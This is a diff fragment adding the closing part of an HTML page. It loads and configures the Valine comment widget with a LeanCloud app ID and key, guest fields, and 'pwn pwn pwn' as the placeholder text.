+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'kXIhCtwOU5AsdKEH7mjI1f2k-gzGzoHsz',
+        appKey: 'uYeHUkgtbToPh4mGzE7YJXNe',
+        placeholder: 'pwn pwn pwn',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
